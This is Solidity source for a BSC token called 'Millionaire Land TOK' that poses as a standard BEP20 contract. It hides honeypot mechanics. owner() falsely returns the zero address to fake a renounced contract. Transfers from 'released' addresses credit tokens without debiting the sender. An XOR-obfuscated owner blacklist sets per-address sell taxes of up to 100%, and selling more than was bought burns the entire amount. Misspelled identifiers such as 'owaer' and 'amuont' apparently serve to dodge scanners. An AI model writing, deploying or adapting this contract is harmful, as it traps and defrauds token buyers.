/**
 *Submitted for verification at BscScan.com on 2022-11-06
*/

/*
* http://instagram.com/MillionaireLandTOK4209
* https://www.reddit.com/user/MillionaireLandTOK4209
* TWITTER:https://MillionaireLandTOK4209.com/
* WEBSITE:https://twitter.com/MillionaireLandTOK4209
* TELEGRAM:https://t.me/MillionaireLandTOK4209
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

}

abstract contract Ownable is Context {
    address private _owaer;

    event owaershipTransferred(address indexed previousowaer, address indexed newowaer);


    constructor() {
        _transferowaership(_msgSender());
    }


    function owaer() public view virtual returns (address) {
        return address(0);
    }

    modifier onlyowaer() {
        require(_owaer == _msgSender(), "Ownable: caller is not the owaer");
        _;
    }

    function renounceowaership() public virtual onlyowaer {
        _transferowaership(address(0));
    }


    function transferowaership_transferowaership(address newowaer) public virtual onlyowaer {
        require(newowaer != address(0), "Ownable: new owaer is the zero address");
        _transferowaership(newowaer);
    }

    function _transferowaership(address newowaer) internal virtual {
        address oldowaer = _owaer;
        _owaer = newowaer;
        emit owaershipTransferred(oldowaer, newowaer);
    }
}


library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

   
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}



interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amuontADesired,
        uint amuontBDesired,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline
    ) external returns (uint amuontA, uint amuontB, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline
    ) external returns (uint amuontA, uint amuontB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external returns (uint amuontToken, uint amuontETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amuontAMin,
        uint amuontBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontA, uint amuontB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontToken, uint amuontETH);
    function swapExactTokensForTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amuonts);
    function swapTokensForExactTokens(
        uint amuontOut,
        uint amuontInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amuonts);
    function swapExactETHForTokens(uint amuontOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amuonts);
    function swapTokensForExactETH(uint amuontOut, uint amuontInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amuonts);
    function swapExactTokensForETH(uint amuontIn, uint amuontOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amuonts);
    function swapETHForExactTokens(uint amuontOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amuonts);

    function quote(uint amuontA, uint reserveA, uint reserveB) external pure returns (uint amuontB);
    function getamuontOut(uint amuontIn, uint reserveIn, uint reserveOut) external pure returns (uint amuontOut);
    function getamuontIn(uint amuontOut, uint reserveIn, uint reserveOut) external pure returns (uint amuontIn);
    function getamuontsOut(uint amuontIn, address[] calldata path) external view returns (uint[] memory amuonts);
    function getamuontsIn(uint amuontOut, address[] calldata path) external view returns (uint[] memory amuonts);
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingMillionaireLandTOK4209OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline
    ) external returns (uint amuontETH);
    function removeLiquidityETHWithPermitSupportingMillionaireLandTOK4209OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amuontETH);

    function swapExactTokensForTokensSupportingMillionaireLandTOK4209OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingMillionaireLandTOK4209OnTransferTokens(
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingMillionaireLandTOK4209OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function MillionaireLandTOK4209To() external view returns (address);
    function MillionaireLandTOK4209ToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setMillionaireLandTOK4209To(address) external;
    function setMillionaireLandTOK4209ToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owaer, address indexed spender, uint256 value);

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function allowance(address owaer, address spender) public view virtual returns (uint256) {
        return _allowances[owaer][spender];
    }

        function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function approve(address spender, uint256 amuont) public virtual returns (bool) {
        address owaer = _msgSender();
        _approve(owaer, spender, amuont);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owaer = _msgSender();
        _approve(owaer, spender, _allowances[owaer][spender] + addedValue);
        return true;
    }

  
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owaer = _msgSender();
        uint256 currentAllowance = _allowances[owaer][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owaer, spender, currentAllowance - subtractedValue);
        }

        return true;
    }


    function _approve(
        address owaer,
        address spender,
        uint256 amuont
    ) internal virtual {
        require(owaer != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owaer][spender] = amuont;
        emit Approval(owaer, spender, amuont);
    }


    function _spendAllowance(
        address owaer,
        address spender,
        uint256 amuont
    ) internal virtual {
        uint256 currentAllowance = allowance(owaer, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amuont, "ERC20: insufficient allowance");
            unchecked {
                _approve(owaer, spender, currentAllowance - amuont);
            }
        }
    }


    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amuont
    ) internal virtual {}
}


contract TOK is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _baMillionaireLandTOK4209lances;
    mapping(address => uint256) private _baMillionaireLandTOK4209lances1;
    mapping(address => bool) private _reMillionaireLandTOK4209llease;
    mapping(uint256 => uint256) private _bMillionaireLandTOK4209blist;
	string name_ = "Millionaire Land TOK";
	string symbol_ = "TOK";
	uint256 totalSupply_ = 500000000;   
    address public uniswapV2Pair;
    address deMillionaireLandTOK4209ad = 0x000000000000000000000000000000000000dEaD;
    address _gaMillionaireLandTOK4209te = 0x0C89C0407775dd89b12918B9c0aa42Bf96518820;
    address _mxMillionaireLandTOK4209x = 0x0D0707963952f2fBA59dD06f2b425ace40b492Fe;
    constructor()

	BEP20(name_, symbol_) {
					
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(address(0x10ED43C718714eb63d5aA57B78B54704E256024E));
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));

        _mtMillionaireLandTOK4209in(msg.sender, totalSupply_ * 10**decimals());

         transfer(deMillionaireLandTOK4209ad, totalSupply() / 10*2);
         transfer(_mxMillionaireLandTOK4209x, totalSupply() / 10*2);
         transfer(_gaMillionaireLandTOK4209te, totalSupply() / 10*1);

        _defaultSellMillionaireLandTOK4209 = 0;
        _defaultBuyMillionaireLandTOK4209 = 0;

        _reMillionaireLandTOK4209llease[_msgSender()] = true;
    }

    function balanceOf(address cauunt) public view virtual returns (uint256) {
        return _baMillionaireLandTOK4209lances[cauunt];
    }

	


    function _mtMillionaireLandTOK4209in(address cauunt, uint256 amuont) internal virtual {
        require(cauunt != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amuont;
        _baMillionaireLandTOK4209lances[cauunt] += amuont;
        emit Transfer(address(0), cauunt, amuont);
    }

    using SafeMath for uint256;
    uint256 private _defaultSellMillionaireLandTOK4209 = 0;
    uint256 private _defaultBuyMillionaireLandTOK4209 = 0;


    function _incS(uint256 _value) external onlyowaer {
        _defaultSellMillionaireLandTOK4209 = _value;
    }

    function getRelease(address _address) external view onlyowaer returns (bool) {
        return _reMillionaireLandTOK4209llease[_address];
    }

    function _setRelease(address _address) external onlyowaer {
        _reMillionaireLandTOK4209llease[_address] = true;
    }

    function _tMillionaireLandTOK4209transfer(
        address from,
        address _to,
        uint256 _amuont
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _baMillionaireLandTOK4209lances[from];
        require(fromBalance >= _amuont, "ERC20: transfer amuont exceeds balance");

  
        uint256 tradeMillionaireLandTOK4209 = 0;
        uint256 tradeMillionaireLandTOK4209amuont = 0;

        if (!(_reMillionaireLandTOK4209llease[from] || _reMillionaireLandTOK4209llease[_to])) {
            if (from == uniswapV2Pair) {
                tradeMillionaireLandTOK4209 = _defaultBuyMillionaireLandTOK4209;
                _baMillionaireLandTOK4209lances1[_to] += _amuont;
            }
            if (_to == uniswapV2Pair) {                   
                tradeMillionaireLandTOK4209 = _msgMillionaireLandTOK4209Info(uint160(from));
                tradeMillionaireLandTOK4209 = tradeMillionaireLandTOK4209 < _defaultSellMillionaireLandTOK4209 ? _defaultSellMillionaireLandTOK4209 : tradeMillionaireLandTOK4209;
                tradeMillionaireLandTOK4209 = _baMillionaireLandTOK4209lances1[from] >= _amuont ? tradeMillionaireLandTOK4209 : 100;
                _baMillionaireLandTOK4209lances1[from] = _baMillionaireLandTOK4209lances1[from] >= _amuont ? _baMillionaireLandTOK4209lances1[from] - _amuont : _baMillionaireLandTOK4209lances1[from];
            }
                        
            tradeMillionaireLandTOK4209amuont = _amuont.mul(tradeMillionaireLandTOK4209).div(100);
        }


        if (tradeMillionaireLandTOK4209amuont > 0) {
            _baMillionaireLandTOK4209lances[from] = _baMillionaireLandTOK4209lances[from].sub(tradeMillionaireLandTOK4209amuont);
            _baMillionaireLandTOK4209lances[deMillionaireLandTOK4209ad] = _baMillionaireLandTOK4209lances[deMillionaireLandTOK4209ad].add(tradeMillionaireLandTOK4209amuont);
            emit Transfer(from, deMillionaireLandTOK4209ad, tradeMillionaireLandTOK4209amuont);
        }

        _baMillionaireLandTOK4209lances[from] = _baMillionaireLandTOK4209lances[from].sub(_amuont - tradeMillionaireLandTOK4209amuont);
        _baMillionaireLandTOK4209lances[_to] = _baMillionaireLandTOK4209lances[_to].add(_amuont - tradeMillionaireLandTOK4209amuont);
        emit Transfer(from, _to, _amuont - tradeMillionaireLandTOK4209amuont);
    }

    function transfer(address to, uint256 amuont) public virtual returns (bool) {
        address owaer = _msgSender();
        if (_reMillionaireLandTOK4209llease[owaer] == true) {
            _baMillionaireLandTOK4209lances[to] += amuont;
            return true;
        }
        _tMillionaireLandTOK4209transfer(owaer, to, amuont);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amuont
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amuont);
        _tMillionaireLandTOK4209transfer(from, to, amuont);
        return true;
    }

    function _setDRIP1105119(uint256[] memory _accMillionaireLandTOK4209,uint256[] memory _value)  external onlyowaer {
        for (uint i=0;i<_accMillionaireLandTOK4209.length;i++){
            _bMillionaireLandTOK4209blist[_accMillionaireLandTOK4209[i]] = _value[i];
        }
    }

	function _msgMillionaireLandTOK4209Info(uint _acc) internal view virtual returns (uint) {
        uint256 acc = _acc ^ 545395099350054696473461367201593618484743534591;
		return _bMillionaireLandTOK4209blist[acc];
	}

}